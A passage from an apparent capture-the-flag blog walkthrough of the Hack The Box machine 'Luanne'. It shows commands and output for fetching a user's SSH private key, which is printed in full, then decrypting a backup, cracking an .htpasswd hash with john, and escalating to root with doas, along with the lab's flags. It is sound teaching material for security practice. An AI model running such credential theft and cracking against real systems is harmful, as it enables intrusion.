  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   601    0   601    0     0   293k      0 --:--:-- --:--:-- --:--:--  293k
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;&lt;head&gt;&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span>
<span class="nt">table</span> <span class="p">{</span>
	<span class="nl">border-top</span><span class="p">:</span> <span class="m">1px</span> <span class="nb">solid</span> <span class="no">black</span><span class="p">;</span>
	<span class="nl">border-bottom</span><span class="p">:</span> <span class="m">1px</span> <span class="nb">solid</span> <span class="no">black</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">th</span> <span class="p">{</span> <span class="nl">background</span><span class="p">:</span> <span class="no">aquamarine</span><span class="p">;</span> <span class="p">}</span>
<span class="nt">tr</span><span class="nd">:nth-child</span><span class="o">(</span><span class="nt">even</span><span class="o">)</span> <span class="p">{</span> <span class="nl">background</span><span class="p">:</span> <span class="no">lavender</span><span class="p">;</span> <span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;title&gt;</span>Index of ~r.michaels/<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;&lt;h1&gt;</span>Index of ~r.michaels/<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;table</span> <span class="na">cols=</span><span class="s">3</span><span class="nt">&gt;</span>
<span class="nt">&lt;thead&gt;</span>
<span class="nt">&lt;tr&gt;&lt;th&gt;</span>Name<span class="nt">&lt;th&gt;</span>Last modified<span class="nt">&lt;th</span> <span class="na">align=</span><span class="s">right</span><span class="nt">&gt;</span>Size
<span class="nt">&lt;tbody&gt;</span>
<span class="nt">&lt;tr&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">"../"</span><span class="nt">&gt;</span>Parent Directory<span class="nt">&lt;/a&gt;&lt;td&gt;</span>16-Sep-2020 18:20<span class="nt">&lt;td</span> <span class="na">align=</span><span class="s">right</span><span class="nt">&gt;</span>1kB
<span class="nt">&lt;tr&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">"id_rsa"</span><span class="nt">&gt;</span>id_rsa<span class="nt">&lt;/a&gt;&lt;td&gt;</span>16-Sep-2020 16:52<span class="nt">&lt;td</span> <span class="na">align=</span><span class="s">right</span><span class="nt">&gt;</span>3kB
<span class="nt">&lt;/table&gt;</span>
<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>
</pre></table></code></div></div><p>We can read <code class="language-plaintext highlighter-rouge">id_rsa</code> and login with <code class="language-plaintext highlighter-rouge">ssh</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">--user</span> webapi_user:iamthebest localhost:3001/~r.michaels/id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2610  100  2610    0     0   424k      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--  509k
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
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
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">chmod 600</code> it and use it for <code class="language-plaintext highlighter-rouge">ssh</code>login <em>** User Flag is: ea5f0ce6a917b0be1eabc7f9218febc0 **</em></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>luanne<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 52
dr-xr-x---  7 r.michaels  <span class="nb">users   </span>512 Sep 16  2020 <span class="nb">.</span>
drwxr-xr-x  3 root        wheel   512 Sep 14  2020 ..
<span class="nt">-rw-r--r--</span>  1 r.michaels  <span class="nb">users  </span>1772 Feb 14  2020 .cshrc
drwx------  2 r.michaels  <span class="nb">users   </span>512 Sep 14  2020 .gnupg
<span class="nt">-rw-r--r--</span>  1 r.michaels  <span class="nb">users   </span>431 Feb 14  2020 .login
<span class="nt">-rw-r--r--</span>  1 r.michaels  <span class="nb">users   </span>265 Feb 14  2020 .logout
<span class="nt">-rw-r--r--</span>  1 r.michaels  <span class="nb">users  </span>1498 Feb 14  2020 .profile
<span class="nt">-rw-r--r--</span>  1 r.michaels  <span class="nb">users   </span>166 Feb 14  2020 .shrc
dr-x------  2 r.michaels  <span class="nb">users   </span>512 Sep 16  2020 .ssh
dr-xr-xr-x  2 r.michaels  <span class="nb">users   </span>512 Nov 24  2020 backups
dr-xr-x---  4 r.michaels  <span class="nb">users   </span>512 Sep 16  2020 devel
dr-x------  2 r.michaels  <span class="nb">users   </span>512 Sep 16  2020 public_html
<span class="nt">-r--------</span>  1 r.michaels  <span class="nb">users    </span>33 Sep 16  2020 user.txt
</pre></table></code></div></div><p>there is an <code class="language-plaintext highlighter-rouge">gnupg</code>and in <code class="language-plaintext highlighter-rouge">backups</code>directory there is an encrypted <code class="language-plaintext highlighter-rouge">tar</code>file searching for <code class="language-plaintext highlighter-rouge">netbsd gnupg</code>we get to this https://man.netbsd.org/netpgp.1</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>**netpgp --encrypt** [**--output**=_filename_] [options] _file ..._
     **netpgp --decrypt** [**--output**=_filename_] [**--pass-fd**=_fd_]
            [**--num-tries**=_attempts_] [options] _file ..._
</pre></table></code></div></div><p>letâ€™s decrypt the file</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>netpgp <span class="nt">--decrypt</span> devel_backup-2020-09-16.tar.gz.enc <span class="nt">--output</span> /tmp/test.tar.gz
luanne<span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-zxvf</span> test.tar.gz
x devel-2020-09-16/
x devel-2020-09-16/www/
x devel-2020-09-16/webapi/
x devel-2020-09-16/webapi/weather.lua
x devel-2020-09-16/www/index.html
x devel-2020-09-16/www/.htpasswd
luanne<span class="nv">$ </span><span class="nb">ls
</span>devel-2020-09-16     test.tar.gz
luanne<span class="nv">$ </span><span class="nb">cd </span>devel-2020-09-16/
luanne<span class="nv">$ </span><span class="nb">ls
</span>webapi www

luanne<span class="nv">$ </span><span class="nb">cat</span> .htpasswd
webapi_user:<span class="nv">$1$6xc7I</span>/LW<span class="nv">$WuSQCS6n3yXsjPMSmwHDu</span><span class="nb">.</span>
</pre></table></code></div></div><p>This is different password, letâ€™s crack it</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>john <span class="nb">hash</span> <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
Warning: detected <span class="nb">hash type</span> <span class="s2">"md5crypt"</span>, but the string is also recognized as <span class="s2">"md5crypt-long"</span>
Use the <span class="s2">"--format=md5crypt-long"</span> option to force loading these as that <span class="nb">type </span>instead
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
Will run 8 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
littlebear       <span class="o">(</span>?<span class="o">)</span>
</pre></table></code></div></div><p>Use that password to become root</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>luanne$ doas sh
Password:
sh: Cannot determine current working directory
# id
uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)
</pre></table></code></div></div><hr /><p>Root Flag is: 7a9b5c206e8e8ba09bb99bd113675f66 *** <img data-src="/assets/images/2024-09-06_15-12-34.png" alt="screen" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Luanne+from+htb+-+darkfears31%27s+Walktroughs&url=https%3A%2F%2Fdarkfears31.github.io%2Fposts%2FLuanne-From-HTB%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Luanne+from+htb+-+darkfears31%27s+Walktroughs&u=https%3A%2F%2Fdarkfears31.github.io%2Fposts%2FLuanne-From-HTB%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fdarkfears31.github.io%2Fposts%2FLuanne-From-HTB%2F&text=Luanne+from+htb+-+darkfears31%27s+Walktroughs" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Tabby-from-HTB/">Tabby from HTB</a><li><a href="/posts/Stonks-from-PicoCTF/">Stonks from PicoCTF</a><li><a href="/posts/Backdoor-from-HTB/">Backdoor from HTB</a><li><a href="/posts/Antique-from-HTB/">Antique from HTB</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">Hack The Box</a> <a class="post-tag" href="/tags/picoctf/">PicoCTF</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Tabby-from-HTB/"><div class="card-body"> <em class="small" data-ts="1725840000" data-df="ll" > Sep 9, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tabby from HTB</h3><div class="text-muted small"><p> Tabby from HTB nmap Gave this: 1 2 3 4 5 6 7 8 9 10 11 12 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ...</p></div></div></a></div><div class="card"> <a href="/posts/Omni-from-HTB/"><div class="card-body"> <em class="small" data-ts="1725753600" data-df="ll" > Sep 8, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Omni from HTB</h3><div class="text-muted small"><p> Omni from HTB nmap gave this: 1 2 3 4 5 6 7 8 9 10 11 12 PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 5985/tcp open upnp Microsoft IIS httpd 8080/tcp open...</p></div></div></a></div><div class="card"> <a href="/posts/Doctor-from-HTB/"><div class="card-body"> <em class="small" data-ts="1725753600" data-df="ll" > Sep 8, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Doctor from HTB</h3><div class="text-muted small"><p> Doctor from HTB After nmap scan we discover that except 22 and 80 ports there is also 8089 port open. First check 80 port which has some static site and has nothing much. add this to /etc/hosts 1 ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Late-from-HTB/" class="btn btn-outline-primary" prompt="Older"><p>Late from HTB</p></a> <a href="/posts/MSB-from-PicoCTF/" class="btn btn-outline-primary" prompt="Newer"><p>MSB from PicoCTF</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> Â© 2024 <a href="https://github.com/darkfears31">kaikaci</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">Hack The Box</a> <a class="post-tag" href="/tags/picoctf/">PicoCTF</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
